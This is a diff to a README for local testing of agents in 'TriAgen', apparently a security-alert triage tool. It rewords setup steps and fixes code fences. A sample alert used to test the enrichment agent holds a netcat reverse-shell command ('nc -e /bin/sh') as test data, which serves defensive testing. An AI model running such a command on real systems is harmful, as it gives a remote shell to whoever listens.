@@ -1,9 +1,11 @@
-## Testing for some of the agents of TriAgen
+## Local testing for some of the agents of TriAgen
 
 1. Start CMD.  
-2. Navigate to the project root directory.  
-3. Run the Python interpreter by typing `python`.  
-4. Inside Python, run the following code:
+2. Navigate to the project root directory `TriAgen`.  
+3. Run`python`.  
+4. Inside Python, run the following relevant code based on the agent U want to test:
+
+Note! This is only for local testing verification.
 
 ### Test alert processor
 ```python
@@ -21,7 +23,7 @@ alert = {
 
 result = process_alert(alert)
 print(result)
-
+```
 
 ### Test enrichment agent
 ```python
@@ -36,6 +38,4 @@ alert = {
         "command": "nc -e /bin/sh 127.0.0.1 5555"
     }
 }
-
-result = enrich_alert(alert)
-print(result)
+```
